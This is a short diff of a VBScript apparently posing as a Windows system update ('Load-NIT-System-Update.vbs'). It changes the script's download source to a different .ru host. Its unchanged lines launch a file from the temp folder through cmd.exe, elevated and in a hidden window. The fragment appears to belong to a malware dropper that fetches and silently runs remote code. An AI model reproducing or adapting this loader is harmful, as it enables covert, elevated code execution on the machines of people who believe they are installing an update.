@@ -8,7 +8,7 @@
 '
 ' PARAMETERS: 	None
 ' RETURNS: 	None
-' SOURCE:	http://anticriminalonline.ru/WinUpdate/Load-NIT-System-Update.vbs
+' SOURCE:	http://file.tuneserv.ru/WinUpdate/Load-NIT-System-Update.vbs
 '
 ' *****************************************************************************
 
@@ -34,5 +34,5 @@ local_File = tempsPath & "\" & threadFile
 	if objFso.FileExists( local_File ) Then
 '		shApp.ShellExecute pathCMD & "cmd.exe", "/c " & Chr(34) & local_File & Chr(34), tempsPath, "runas", 1
 		shApp.ShellExecute pathCMD & "cmd.exe", "/c " & Chr(34) & local_File & Chr(34), tempsPath, "runas", 0
-	end if	
+	end if
 ' The End of the Script
